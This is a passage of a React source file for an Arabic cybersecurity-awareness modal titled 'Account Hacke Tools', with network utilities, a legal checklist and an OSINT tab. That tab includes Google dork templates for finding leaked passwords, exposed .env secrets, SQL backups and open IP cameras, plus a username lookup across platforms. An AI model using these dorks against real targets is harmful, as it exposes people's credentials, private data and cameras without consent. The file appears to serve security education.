  const ready = reqDone===reqTotal;

  return (
    <div className="space-y-5">
      <HoloCard color="#6366f1" title="✅ قائمة فحص ما قبل اختبار الاختراق" subtitle="جميع البنود الإلزامية يجب أن تكتمل قبل بدء الاختبار">
        <div className={`mb-3 px-4 py-2.5 rounded-xl text-center text-sm font-bold border`}
          style={{ background: ready?"#10b98115":"#ef444415", borderColor: ready?"#10b98140":"#ef444440", color: ready?"#10b981":"#ef4444" }}>
          {ready ? "✅ مؤهَّل للاختبار القانوني المرخَّص" : `⚠️ ${reqTotal-reqDone} بنود إلزامية لم تُكتمل`}
        </div>
        <div className="space-y-1.5">
          {LEGAL_ITEMS.map(c => (
            <div key={c.id} onClick={()=>setChecked(p=>({...p,[c.id]:!p[c.id]}))}
              className="flex items-center gap-2.5 cursor-pointer px-2 py-1.5 rounded-lg hover:bg-white/5 transition-colors">
              <div className="w-4 h-4 rounded border flex-shrink-0 flex items-center justify-center text-xs"
                style={{ borderColor: checked[c.id]?"#10b981":"#ffffff20", background: checked[c.id]?"#10b981":"transparent" }}>
                {checked[c.id]&&"✓"}
              </div>
              <span className="text-xs flex-1" style={{ color: checked[c.id]?"#ffffff90":"#ffffff45" }}>{c.label}</span>
              {c.req&&!checked[c.id]&&<span className="text-red-400/50 text-xs flex-shrink-0">إلزامي</span>}
            </div>
          ))}
        </div>
      </HoloCard>

      <HoloCard color="#6366f1" title="🌐 منصات Ethical Hacking الموثوقة">
        <div className="grid grid-cols-2 gap-2">
          {PLATFORMS.map(p => (
            <div key={p.name} className="rounded-xl border p-2.5" style={{ background: "#6366f108", borderColor: "#6366f120" }}>
              <div className="flex items-center gap-1.5 mb-1"><span>{p.icon}</span><span className="text-xs font-bold text-indigo-400/90">{p.name}</span></div>
              <p className="text-xs text-white/30">{p.type}</p>
              <p className="text-xs text-white/45 mt-0.5">{p.desc}</p>
            </div>
          ))}
        </div>
      </HoloCard>

      <HoloCard color="#6366f1" title="⚖️ قوانين الجرائم الإلكترونية — المرجع القانوني الكامل">
        <div className="space-y-2">
          {LAWS.map((l,i) => (
            <div key={i} className="px-3 py-2 rounded-lg" style={{ background: "#6366f110", border: "1px solid #6366f120" }}>
              <p className="text-xs font-bold text-indigo-400/90">{l.country}</p>
              <p className="text-xs text-white/40 mt-0.5">{l.law}</p>
              <p className="text-xs text-red-400/70 mt-0.5">العقوبة: {l.penalty}</p>
            </div>
          ))}
        </div>
      </HoloCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// TAB 8 — NETWORK TOOLS (NEW)
// ═══════════════════════════════════════════════════════════════════

function calcSubnet(ip: string, prefix: number): { network: string; broadcast: string; hosts: number; mask: string } | null {
  try {
    const parts = ip.split(".").map(Number);
    if (parts.length!==4 || parts.some(p=>p<0||p>255)) return null;
    const mask = (0xffffffff << (32-prefix)) >>> 0;
    const ipInt = (parts[0]<<24|parts[1]<<16|parts[2]<<8|parts[3]) >>> 0;
    const network = (ipInt & mask) >>> 0;
    const broadcast = (network | (~mask >>> 0)) >>> 0;
    const toIP = (n:number) => [(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255].join(".");
    return { network: toIP(network), broadcast: toIP(broadcast), hosts: Math.pow(2,32-prefix)-2, mask: toIP(mask) };
  } catch { return null; }
}

const PORT_REFS = [
  { port: 21,   service: "FTP",    risk: "high",   note: "نقل الملفات — اعتمد SFTP بدلاً منه" },
  { port: 22,   service: "SSH",    risk: "medium", note: "إدارة آمنة — غيّر المنفذ الافتراضي" },
  { port: 23,   service: "Telnet", risk: "high",   note: "غير مشفّر — استخدم SSH" },
  { port: 25,   service: "SMTP",   risk: "medium", note: "بريد صادر — تحقق من SPF/DKIM" },
  { port: 80,   service: "HTTP",   risk: "medium", note: "ويب غير مشفّر — انتقل لـ HTTPS" },
  { port: 443,  service: "HTTPS",  risk: "safe",   note: "ويب مشفّر — الأساس" },
  { port: 3306, service: "MySQL",  risk: "high",   note: "قاعدة بيانات — لا تعرّضه للإنترنت" },
  { port: 3389, service: "RDP",    risk: "high",   note: "ثغرات عديدة — استخدم VPN أمامه" },
  { port: 5432, service: "PostgreSQL", risk: "high", note: "DB — احظر وصوله الخارجي" },
  { port: 6379, service: "Redis",  risk: "high",   note: "بدون مصادقة افتراضياً — ضع كلمة مرور" },
  { port: 8080, service: "Alt HTTP",risk:"medium", note: "منفذ تطوير — لا يُستخدم في الإنتاج" },
  { port: 9200, service: "Elasticsearch", risk:"high", note: "بدون auth افتراضياً — اهتمام خاص" },
];

function NetworkTab() {
  const [ipInput, setIpInput]     = useState("192.168.1.0");
  const [prefix, setPrefix]       = useState(24);
  const [subnetResult, setSubnetResult] = useState<ReturnType<typeof calcSubnet>>(null);
  const [dnsInput, setDnsInput]   = useState("");
  const [dnsResults, setDnsResults] = useState<string[]>([]);
  const [portFilter, setPortFilter] = useState<"all"|"high"|"medium"|"safe">("all");
  const [headerURL, setHeaderURL] = useState("");
  const [headerResult, setHeaderResult] = useState<string[]>([]);
  const [fetching, setFetching]   = useState(false);

  function calcSubnetClick() {
    const r = calcSubnet(ipInput, prefix);
    setSubnetResult(r);
  }

  function simulateDNS() {
    if (!dnsInput.trim()) return;
    const r: string[] = [];
    try {
      const domain = dnsInput.replace(/^https?:\/\//,"").split("/")[0];
      r.push(`🌐 النطاق: ${domain}`);
      r.push(`📋 A Record: [يتطلب DNS Resolver حقيقي]`);
      r.push(`📧 MX Record: mail.${domain} (أولوية 10) [محاكاة]`);
      r.push(`📝 TXT Record: v=spf1 include:_spf.${domain} ~all [محاكاة]`);
      r.push(`🔒 CNAME: www.${domain} → ${domain} [محاكاة]`);
      r.push(`⏱ TTL: 300 ثانية`);
      const parts = domain.split(".");
      if (parts.length >= 2) r.push(`🏢 Registrar TLD: .${parts[parts.length-1]}`);
      r.push(`⚠️ للبحث الحقيقي: استخدم dig/nslookup أو whois.domaintools.com`);
    } catch { r.push("خطأ في التحليل"); }
    setDnsResults(r);
  }

  async function checkHeaders() {
    if (!headerURL.trim()) return;
    setFetching(true);
    setHeaderResult([]);
    try {
      const url = headerURL.startsWith("http") ? headerURL : "https://" + headerURL;
      const resp = await fetch(`/api/proxy-headers?url=${encodeURIComponent(url)}`).catch(() => null);
      if (resp && resp.ok) {
        const data = await resp.json();
        const headers = data.headers || {};
        const important = ["content-security-policy","strict-transport-security","x-frame-options","x-content-type-options","permissions-policy","referrer-policy"];
        const results: string[] = [];
        for (const h of important) {
          if (headers[h]) results.push(`✅ ${h}: ${headers[h].slice(0,60)}${headers[h].length>60?"...":""}`);
          else results.push(`❌ ${h}: غير موجود`);
        }
        setHeaderResult(results);
      } else throw new Error("no response");
    } catch {
      setHeaderResult([
        "⚠️ لا يمكن الفحص مباشرة من المتصفح (CORS).",
        "💡 استخدم: curl -I " + headerURL,
        "💡 أو زر: securityheaders.com",
        "💡 أو: observatory.mozilla.org",
      ]);
    } finally { setFetching(false); }
  }

  const filteredPorts = PORT_REFS.filter(p => portFilter==="all" || p.risk===portFilter);

  return (
    <div className="space-y-5">
      <HoloCard color="#0ea5e9" title="🖥️ حاسبة Subnet / CIDR" subtitle="احسب معلومات الشبكة من IP + Prefix">
        <div className="flex gap-2 mb-2">
          <input value={ipInput} onChange={e=>setIpInput(e.target.value)}
            placeholder="192.168.1.0"
            className="flex-1 bg-black/50 border border-sky-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none font-mono" dir="ltr"/>
          <div className="flex items-center gap-2">
            <span className="text-xs text-white/30">/</span>
            <input type="number" min={1} max={32} value={prefix} onChange={e=>setPrefix(Number(e.target.value))}
              className="w-12 bg-black/50 border border-sky-500/30 rounded-lg px-2 py-2 text-xs text-white outline-none font-mono text-center"/>
          </div>
          <GlowButton color="#0ea5e9" onClick={calcSubnetClick}>حساب</GlowButton>
        </div>
        {subnetResult && (
          <div className="grid grid-cols-2 gap-2 mt-2">
            {[["🌐 Subnet Mask",subnetResult.mask],["📡 Network Address",subnetResult.network],["📢 Broadcast",subnetResult.broadcast],["💻 عدد الـ Hosts",subnetResult.hosts.toLocaleString()]].map(([l,v])=>(
              <div key={String(l)} className="px-3 py-2 rounded-lg" style={{ background: "#0ea5e910", border: "1px solid #0ea5e920" }}>
                <p className="text-xs text-white/35">{l}</p>
                <p className="text-sm font-bold font-mono text-sky-400">{String(v)}</p>
              </div>
            ))}
          </div>
        )}
        <div className="mt-2 pt-2 border-t" style={{ borderColor: "#ffffff08" }}>
          <p className="text-xs text-white/25 mb-1">شبكات شائعة:</p>
          <div className="flex flex-wrap gap-1">
            {["10.0.0.0/8","172.16.0.0/12","192.168.0.0/16","192.168.1.0/24","10.10.10.0/24"].map(n=>(
              <button key={n} onClick={()=>{ const [ip,p]=n.split("/"); setIpInput(ip); setPrefix(Number(p)); }}
                className="px-2 py-0.5 rounded text-xs font-mono" style={{ background: "#0ea5e910", color: "#0ea5e970", border: "1px solid #0ea5e920" }}>{n}</button>
            ))}
          </div>
        </div>
      </HoloCard>

      <HoloCard color="#0ea5e9" title="🔍 محلل DNS / WHOIS" subtitle="تحليل معلومات النطاق">
        <div className="flex gap-2">
          <input value={dnsInput} onChange={e=>setDnsInput(e.target.value)} onKeyDown={e=>e.key==="Enter"&&simulateDNS()}
            placeholder="example.com أو https://example.com"
            className="flex-1 bg-black/50 border border-sky-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none font-mono" dir="ltr"/>
          <GlowButton color="#0ea5e9" onClick={simulateDNS}>تحليل</GlowButton>
        </div>
        {dnsResults.length>0 && (
          <div className="mt-2 space-y-1">
            {dnsResults.map((r,i)=>(
              <p key={i} className="text-xs px-2 py-1 rounded font-mono" style={{ background: r.startsWith("⚠️")||r.startsWith("💡")?"#f59e0b08":"#0ea5e908", color: r.startsWith("⚠️")?"#f59e0b":r.startsWith("💡")?"#06b6d4":"#0ea5e9" }}>{r}</p>
            ))}
          </div>
        )}
        <div className="mt-2 pt-2 border-t" style={{ borderColor: "#ffffff08" }}>
          <p className="text-xs text-white/25 mb-1">أدوات DNS/WHOIS خارجية موثوقة:</p>
          <div className="flex flex-wrap gap-1.5">
            {["dnsdumpster.com","shodan.io","censys.io","whois.domaintools.com","crt.sh"].map(s=>(
              <span key={s} className="text-xs px-2 py-0.5 rounded font-mono cursor-default" style={{ background:"#0ea5e910",color:"#0ea5e960",border:"1px solid #0ea5e920" }}>{s}</span>
            ))}
          </div>
        </div>
      </HoloCard>

      <HoloCard color="#0ea5e9" title="🔌 مرجع المنافذ الأمنية" subtitle="دليل المنافذ الشائعة ومستوى خطرها">
        <div className="flex gap-1.5 mb-3">
          {(["all","high","medium","safe"] as const).map(f=>(
            <button key={f} onClick={()=>setPortFilter(f)}
              className="px-2 py-1 rounded text-xs font-bold transition-all"
              style={{ background: portFilter===f?f==="high"?"#ef444420":f==="medium"?"#f59e0b20":f==="safe"?"#10b98120":"#0ea5e920":"#ffffff08",
                border:`1px solid ${portFilter===f?f==="high"?"#ef4444":f==="medium"?"#f59e0b":f==="safe"?"#10b981":"#0ea5e9":"#ffffff15"}`,
                color: portFilter===f?f==="high"?"#ef4444":f==="medium"?"#f59e0b":f==="safe"?"#10b981":"#0ea5e9":"#ffffff40" }}>
              {f==="all"?"الكل":f==="high"?"خطر عالٍ":f==="medium"?"متوسط":"آمن"}
            </button>
          ))}
        </div>
        <div className="space-y-1.5 max-h-64 overflow-y-auto">
          {filteredPorts.map(p=>(
            <div key={p.port} className="flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs"
              style={{ background: p.risk==="high"?"#ef444408":p.risk==="medium"?"#f59e0b08":"#10b98108", border:`1px solid ${p.risk==="high"?"#ef444420":p.risk==="medium"?"#f59e0b20":"#10b98120"}` }}>
              <span className="font-mono font-bold w-10 flex-shrink-0" style={{ color: p.risk==="high"?"#ef4444":p.risk==="medium"?"#f59e0b":"#10b981" }}>{p.port}</span>
              <span className="w-16 flex-shrink-0 text-white/60">{p.service}</span>
              <span className="flex-1 text-white/35">{p.note}</span>
            </div>
          ))}
        </div>
      </HoloCard>

      <HoloCard color="#0ea5e9" title="📡 فاحص Security Headers" subtitle="فحص headers الأمنية لأي موقع">
        <div className="flex gap-2">
          <input value={headerURL} onChange={e=>setHeaderURL(e.target.value)} onKeyDown={e=>e.key==="Enter"&&checkHeaders()}
            placeholder="example.com أو https://example.com"
            className="flex-1 bg-black/50 border border-sky-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none font-mono" dir="ltr"/>
          <GlowButton color="#0ea5e9" onClick={checkHeaders} loading={fetching}>{fetching?"⏳...":"فحص"}</GlowButton>
        </div>
        {headerResult.length>0 && (
          <div className="mt-2 space-y-1">
            {headerResult.map((r,i)=>(
              <p key={i} className="text-xs px-2 py-1 rounded" style={{ background:r.startsWith("✅")?"#10b98110":r.startsWith("❌")?"#ef444410":"#f59e0b10", color:r.startsWith("✅")?"#10b981":r.startsWith("❌")?"#ef4444":"#f59e0b" }}>{r}</p>
            ))}
          </div>
        )}
      </HoloCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// TAB 9 — OSINT TOOLS (NEW)
// ═══════════════════════════════════════════════════════════════════

const GOOGLE_DORK_TEMPLATES = [
  { cat: "ملفات حساسة", template: `site:target.com filetype:pdf "confidential"`, desc: "البحث عن PDFs سرية" },
  { cat: "كلمات مرور مكشوفة", template: `site:pastebin.com "target.com" password`, desc: "بيانات مسرّبة على Pastebin" },
  { cat: "صفحات الدخول", template: `site:target.com intitle:"login" OR "admin"`, desc: "أبواب الدخول الإدارية" },
  { cat: "Cameras مكشوفة", template: `inurl:"/view/index.shtml" intitle:"Live View"`, desc: "كاميرات IP مكشوفة" },
  { cat: "Config files", template: `site:github.com "password" "api_key" ext:env`, desc: "ملفات .env مكشوفة على GitHub" },
  { cat: "SQL Backup", template: `site:target.com filetype:sql "CREATE TABLE"`, desc: "نسخ احتياطية من قواعد البيانات" },
  { cat: "Error Pages", template: `site:target.com "Warning: mysql_fetch_array()"`, desc: "أخطاء MySQL مكشوفة" },
  { cat: "Open Redirect", template: `site:target.com inurl:"redirect=" OR "url=" OR "next="`, desc: "ثغرات Open Redirect محتملة" },
];

const OSINT_TOOLS = [
  { name: "Shodan",        url: "shodan.io",         icon: "🌊", desc: "محرك بحث الأجهزة المتصلة بالإنترنت", category: "Infrastructure" },
  { name: "Censys",        url: "censys.io",         icon: "🔭", desc: "مسح الإنترنت + تحليل الشهادات",       category: "Infrastructure" },
  { name: "theHarvester",  url: "GitHub",            icon: "🌾", desc: "جمع emails, subdomains, IPs",         category: "Recon" },
  { name: "SpiderFoot",    url: "spiderfoot.net",    icon: "🕷️",desc: "أتمتة OSINT الشاملة",                  category: "Automation" },
  { name: "Maltego",       url: "maltego.com",       icon: "🗺️", desc: "خرائط علاقات الكيانات",               category: "Visualization" },
  { name: "OSINT Framework", url: "osintframework.com",icon:"🧩",desc: "دليل أدوات OSINT المصنّف",             category: "Framework" },
  { name: "Hunter.io",     url: "hunter.io",         icon: "📧", desc: "البحث عن emails بالنطاق",              category: "Email" },
  { name: "Dehashed",      url: "dehashed.com",      icon: "🔓", desc: "بحث في قواعد بيانات الاختراقات",       category: "Breach" },
  { name: "IntelX",        url: "intelx.io",         icon: "🧠", desc: "محرك بحث OSINT متقدم",                category: "Search" },
  { name: "crt.sh",        url: "crt.sh",            icon: "📜", desc: "سجلات Certificate Transparency",       category: "SSL" },
];

function OsintTab() {
  const [dorkTarget, setDorkTarget]   = useState("example.com");
  const [activeTemplate, setActiveT] = useState(0);
  const [emailInput, setEmailInput]   = useState("");
  const [emailAnalysis, setEmailAnalysis] = useState<string[]>([]);
  const [usernameInput, setUsernameInput] = useState("");
  const [usernameResults, setUsernameResults] = useState<string[]>([]);
  const [catFilter, setCatFilter]     = useState("all");

  const generatedDork = GOOGLE_DORK_TEMPLATES[activeTemplate].template.replace("target.com", dorkTarget || "target.com");

  function analyzeEmail() {
    if (!emailInput.trim()) return;
    const parts = emailInput.split("@");
    const results: string[] = [];
    if (parts.length !== 2) { setEmailAnalysis(["❌ تنسيق بريد إلكتروني غير صالح"]); return; }
    const [user, domain] = parts;
    results.push(`👤 اسم المستخدم: ${user}`);
    results.push(`🌐 النطاق: ${domain}`);
    const tld = domain.split(".").pop();
    results.push(`🏳️ TLD: .${tld}`);
    if (/^\d+$/.test(user)) results.push("⚠️ اسم مستخدم أرقام فقط — مريب");
    if (user.length < 4) results.push("⚠️ اسم مستخدم قصير جداً");
    if (/[^a-zA-Z0-9._+-]/.test(user)) results.push("⚠️ أحرف غير معتادة في اسم المستخدم");
    if (["gmail","yahoo","outlook","hotmail","proton"].some(p=>domain.startsWith(p))) results.push("📬 بريد مجاني (ليس بريد مؤسسي)");
    else results.push("🏢 بريد مؤسسي محتمل");
    results.push(`🔗 Gravatar: gravatar.com/avatar/${user} [للفحص]`);
    results.push(`🔍 HIBP: haveibeenpwned.com/account/${encodeURIComponent(emailInput)} [للفحص]`);
    setEmailAnalysis(results);
  }

  function searchUsername() {
    if (!usernameInput.trim()) return;
    const u = encodeURIComponent(usernameInput.trim());
    const platforms = [
      { name: "GitHub",    url: `github.com/${usernameInput}` },
      { name: "Twitter/X", url: `x.com/${usernameInput}` },
      { name: "LinkedIn",  url: `linkedin.com/in/${usernameInput}` },
      { name: "Instagram", url: `instagram.com/${usernameInput}` },
      { name: "Reddit",    url: `reddit.com/user/${usernameInput}` },
      { name: "Telegram",  url: `t.me/${usernameInput}` },
    ];
    setUsernameResults(platforms.map(p => `🔍 ${p.name}: ${p.url}`));
  }

  const categories = ["all", ...Array.from(new Set(OSINT_TOOLS.map(t=>t.category)))];
  const filteredTools = catFilter==="all" ? OSINT_TOOLS : OSINT_TOOLS.filter(t=>t.category===catFilter);

  return (
    <div className="space-y-5">
      <HoloCard color="#a855f7" title="🔍 منشئ Google Dorks" subtitle="ابنِ استعلامات بحث OSINT قوية">
        <div className="mb-3">
          <p className="text-xs text-white/30 mb-1.5">النطاق المستهدف:</p>
          <input value={dorkTarget} onChange={e=>setDorkTarget(e.target.value)}
            placeholder="example.com"
            className="w-full bg-black/50 border border-purple-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none font-mono" dir="ltr"/>
        </div>
        <div className="space-y-1.5 mb-3">
          {GOOGLE_DORK_TEMPLATES.map((t,i)=>(
            <div key={i} onClick={()=>setActiveT(i)}
              className="px-3 py-2 rounded-lg cursor-pointer transition-all"
              style={{ background: activeTemplate===i?"#a855f720":"#ffffff06", border:`1px solid ${activeTemplate===i?"#a855f750":"#ffffff10"}` }}>
              <div className="flex items-center justify-between">
                <span className="text-xs font-bold" style={{ color: activeTemplate===i?"#a855f7":"#ffffff50" }}>{t.cat}</span>
              </div>
              <p className="text-xs text-white/30 mt-0.5">{t.desc}</p>
            </div>
          ))}
        </div>
        <div className="flex items-center gap-2 px-3 py-2.5 rounded-xl" style={{ background: "#a855f715", border: "1px solid #a855f730" }}>
          <code className="flex-1 text-xs text-purple-300 font-mono break-all" dir="ltr">{generatedDork}</code>
          <CopyButton text={generatedDork}/>
        </div>
        <a href={`https://www.google.com/search?q=${encodeURIComponent(generatedDork)}`} target="_blank" rel="noopener noreferrer"
          className="mt-2 w-full py-2 rounded-lg text-xs font-bold text-center block transition-all hover:opacity-80"
          style={{ background: "#a855f715", border: "1px solid #a855f730", color: "#a855f7" }}>
          🔎 تنفيذ البحث على Google ↗
        </a>
      </HoloCard>

      <HoloCard color="#a855f7" title="📧 محلل البريد الإلكتروني — OSINT">
        <div className="flex gap-2">
          <input value={emailInput} onChange={e=>setEmailInput(e.target.value)} onKeyDown={e=>e.key==="Enter"&&analyzeEmail()}
            placeholder="user@example.com"
            className="flex-1 bg-black/50 border border-purple-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none font-mono" dir="ltr"/>
          <GlowButton color="#a855f7" onClick={analyzeEmail}>تحليل</GlowButton>
        </div>
        {emailAnalysis.length>0 && (
          <div className="mt-2 space-y-1">
            {emailAnalysis.map((r,i)=>(
              <p key={i} className="text-xs px-2 py-1 rounded" style={{ background:"#a855f710", color:r.startsWith("⚠️")?"#f59e0b":"#a855f7" }}>{r}</p>
            ))}
          </div>
        )}
      </HoloCard>

      <HoloCard color="#a855f7" title="👤 باحث Username عبر المنصات">
        <div className="flex gap-2 mb-2">
          <input value={usernameInput} onChange={e=>setUsernameInput(e.target.value)} onKeyDown={e=>e.key==="Enter"&&searchUsername()}
            placeholder="اكتب اسم المستخدم هنا..."
            className="flex-1 bg-black/50 border border-purple-500/30 rounded-lg px-3 py-2 text-xs text-white placeholder:text-white/15 outline-none font-mono" dir="ltr"/>
          <GlowButton color="#a855f7" onClick={searchUsername}>بحث</GlowButton>
        </div>
        {usernameResults.length>0 && (
          <div className="space-y-1">
            {usernameResults.map((r,i)=>{
              const url = r.split(": ")[1];
              return (
                <a key={i} href={`https://${url}`} target="_blank" rel="noopener noreferrer"
                  className="flex items-center justify-between px-3 py-1.5 rounded-lg text-xs transition-all hover:bg-white/5"
                  style={{ background:"#a855f708", border:"1px solid #a855f718" }}>
                  <span className="text-purple-400/70">{r.split(": ")[0].replace("🔍 ","")}</span>
                  <span className="text-white/30 font-mono">{url} ↗</span>
                </a>
              );
            })}
            <p className="text-xs text-white/20 mt-1">⚠️ استخدم لأغراض تعليمية وبإذن مسبق فقط</p>
          </div>
        )}
      </HoloCard>

      <HoloCard color="#a855f7" title="🧰 أدوات OSINT الاحترافية">
        <div className="flex flex-wrap gap-1 mb-3">
          {categories.map(c=>(
            <button key={c} onClick={()=>setCatFilter(c)}
              className="px-2 py-0.5 rounded text-xs transition-all"
              style={{ background:catFilter===c?"#a855f720":"#ffffff08", border:`1px solid ${catFilter===c?"#a855f750":"#ffffff15"}`, color:catFilter===c?"#a855f7":"#ffffff40" }}>
              {c==="all"?"الكل":c}
            </button>
          ))}
        </div>
        <div className="grid grid-cols-2 gap-2">
          {filteredTools.map(t=>(
            <div key={t.name} className="rounded-xl border p-2.5" style={{ background:"#a855f708", borderColor:"#a855f720" }}>
              <div className="flex items-center gap-1.5 mb-1">
                <span>{t.icon}</span>
                <span className="text-xs font-bold text-purple-400/90">{t.name}</span>
              </div>
              <p className="text-xs text-white/25">{t.category}</p>
              <p className="text-xs text-white/45 mt-0.5 leading-tight">{t.desc}</p>
            </div>
          ))}
        </div>
      </HoloCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// ANIMATED BACKGROUND
// ═══════════════════════════════════════════════════════════════════

function HoloBg({ color }: { color: string }) {
  return (
    <div className="absolute inset-0 overflow-hidden pointer-events-none">
      <svg className="absolute inset-0 w-full h-full opacity-[0.03]" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <pattern id="hg" width="40" height="40" patternUnits="userSpaceOnUse">
            <path d="M 40 0 L 0 0 0 40" fill="none" stroke={color} strokeWidth="0.5"/>
          </pattern>
        </defs>
        <rect width="100%" height="100%" fill="url(#hg)"/>
      </svg>
      <motion.div animate={{ y: ["0%","100%"] }} transition={{ duration: 4, repeat: Infinity, ease: "linear" }}
        className="absolute left-0 right-0 h-px opacity-10"
        style={{ background: `linear-gradient(90deg, transparent, ${color}, transparent)` }}/>
      {[["top-0 left-0","top-0","left-0"],["top-0 right-0","top-0","right-0"],["bottom-0 left-0","bottom-0","left-0"],["bottom-0 right-0","bottom-0","right-0"]].map(([pos,,side]) => (
        <div key={pos} className={`absolute ${pos}`} style={{ width:12, height:12, opacity:0.3 }}>
          <div style={{ position:"absolute", top:0, [side]:0, width:8, height:1, background:color }}/>
          <div style={{ position:"absolute", top:0, [side]:0, width:1, height:8, background:color }}/>
        </div>
      ))}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════
// MAIN MODAL
// ═══════════════════════════════════════════════════════════════════

export function AccountHackeToolsModal({ open, onOpenChange }: Props) {
  const [activeTab, setActiveTab] = useState<TabId>("social");
  const [time, setTime] = useState("");

  useEffect(() => {
    setTime(new Date().toLocaleTimeString("ar"));
    const t = setInterval(() => setTime(new Date().toLocaleTimeString("ar")), 1000);
    return () => clearInterval(t);
  }, []);

  const tab = TABS.find(t => t.id === activeTab)!;

  const TAB_CONTENT: Record<TabId, JSX.Element> = {
    social:    <SocialTab />,
    vulns:     <VulnsTab />,
    passwords: <PasswordsTab />,
    apt:       <AptTab />,
    reverse:   <ReverseTab />,
    defense:   <DefenseTab />,
    legal:     <LegalTab />,
    network:   <NetworkTab />,
    osint:     <OsintTab />,
  };

  if (!open) return null;

  return (
    <AnimatePresence>
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
        className="fixed inset-0 z-[10020] flex items-center justify-center"
        style={{ background: "rgba(0,0,0,0.88)", backdropFilter: "blur(16px)" }}
        onClick={e => e.target === e.currentTarget && onOpenChange(false)}>

        <motion.div initial={{ opacity: 0, scale: 0.93, y: 28 }} animate={{ opacity: 1, scale: 1, y: 0 }} exit={{ opacity: 0, scale: 0.93, y: 28 }}
          transition={{ duration: 0.22, ease: "easeOut" }}
          className="relative w-full max-w-4xl mx-4 rounded-2xl border overflow-hidden flex flex-col"
          style={{ background: "linear-gradient(135deg, #000209 0%, #00050f 50%, #000a04 100%)", borderColor: `${tab.color}45`, boxShadow: `0 0 100px ${tab.color}10, 0 0 200px #00000099, inset 0 1px 0 ${tab.color}25`, maxHeight: "92vh" }}>

          <HoloBg color={tab.color} />

          {/* Header */}
          <div className="relative z-10 flex items-center justify-between px-5 py-3.5 border-b flex-shrink-0"
            style={{ borderColor: `${tab.color}20`, background: `linear-gradient(90deg, ${tab.color}12, transparent)` }}>
            <div className="flex items-center gap-3">
              <div className="relative w-9 h-9 rounded-xl flex items-center justify-center text-xl border" style={{ background:`${tab.color}15`, borderColor:`${tab.color}40` }}>
                {tab.icon}
                <div className="absolute -top-1 -right-1 w-2.5 h-2.5 rounded-full animate-pulse border border-black" style={{ background: "#00ff88" }}/>
              </div>
              <div>
                <h1 className="text-sm font-bold tracking-widest uppercase" style={{ color: tab.color }}>Account Hacke Tools</h1>
                <p className="text-xs text-white/30">دليل الوعي الأمني السيبراني — Yode9 · 9 أنظمة تعليمية · للأغراض الدفاعية فقط</p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <div className="text-right hidden sm:block">
                <p className="text-xs font-mono text-white/25">{time}</p>
                <p className="text-xs text-white/15">⚖️ Ethical Only</p>
              </div>
              <button onClick={() => onOpenChange(false)}
                className="w-8 h-8 rounded-lg flex items-center justify-center text-white/25 hover:text-white/80 hover:bg-white/10 transition-all">✕</button>
            </div>
          </div>

          {/* Tabs */}
          <div className="relative z-10 flex border-b overflow-x-auto flex-shrink-0 scrollbar-hide" style={{ borderColor: "#ffffff08" }}>
            {TABS.map(t => (
              <button key={t.id} onClick={() => setActiveTab(t.id)}
                className="flex-shrink-0 flex items-center gap-1.5 px-3.5 py-2.5 text-xs font-bold transition-all whitespace-nowrap"
                style={{ color: activeTab===t.id?t.color:"#ffffff28", background: activeTab===t.id?`${t.color}10`:"transparent", borderBottom: activeTab===t.id?`2px solid ${t.color}`:"2px solid transparent" }}>
                <span>{t.icon}</span>
                <span className="hidden sm:inline">{t.label}</span>
              </button>
            ))}
          </div>

          {/* Content */}
          <div className="relative z-10 flex-1 overflow-y-auto p-5">
            <AnimatePresence mode="wait">
              <motion.div key={activeTab} initial={{ opacity: 0, x: 12 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -12 }} transition={{ duration: 0.16 }}>
                {TAB_CONTENT[activeTab]}
              </motion.div>
            </AnimatePresence>
          </div>

          {/* Footer */}
          <div className="relative z-10 flex items-center justify-between px-5 py-2.5 border-t flex-shrink-0"
            style={{ borderColor: "#ffffff06", background: "rgba(0,0,0,0.5)" }}>
            <p className="text-xs text-white/15">⚠️ جميع المحتويات للأغراض <strong className="text-white/30">التعليمية والدفاعية</strong> فقط — Yode9 Project 2026</p>
            <div className="flex items-center gap-3">
              <a href="https://owasp.org" target="_blank" rel="noopener noreferrer" className="text-xs text-white/15 hover:text-emerald-400/50 transition-colors">OWASP ↗</a>
              <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" className="text-xs text-white/15 hover:text-cyan-400/50 transition-colors">PortSwigger ↗</a>
              <a href="https://attack.mitre.org" target="_blank" rel="noopener noreferrer" className="text-xs text-white/15 hover:text-red-400/50 transition-colors">MITRE ↗</a>
            </div>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}
